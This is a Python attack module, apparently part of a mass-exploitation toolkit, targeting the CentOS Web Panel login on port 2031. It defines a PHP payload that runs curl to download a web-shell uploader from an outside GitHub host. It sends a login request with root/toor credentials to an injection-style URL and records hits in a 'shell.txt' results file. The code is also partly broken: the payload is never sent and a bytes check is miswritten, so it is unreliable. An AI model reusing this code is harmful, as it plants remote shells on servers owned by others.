import requests,random
import urllib.parse
from files.localuseragent import *
from tool._print import print_shell,not_vuln

def main(url):
    try:
        code = '<?php system("curl -O https://raw.githubusercontent.com/rodieka/php/main/uploader.php"); system("mv uploader up.php"); ?>'
        shell = urllib.parse.quote(code)
        headers = {
            "Content-Length": "40",
            "Cookie": "cwpsrv-2dbdc5905576590830494c54c04a1b01=6ahj1a6etv72ut1eaupietdk82",
            "Origin": f"https://{url}:2031",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-agent": random.choice(ua["browsers"]["chrome"]),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Referer": f"https://{url}:2031/login/index.php?login=failed",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en",
            "Connection": "close"
        }

        data = {
            "username": "root",
            "password": "toor",
            "commit": "Login"
        }

        response = requests.post(f"https://{url}:2031/login/index.php?login=(id)", headers=headers, data=data, verify=False, timeout=10)
        if "Login Redirect" in response.content:
            with open('result/shell.txt',"a") as xs:
                xs.write(f"{url}:2031/login/index.php?login=$\n")
                # return print_shell(cms="", poc="centos", site=url)
                return response.content
    except Exception as e:
        # return not_vuln(cms="", poc="centos ", site=url)
        print(e)
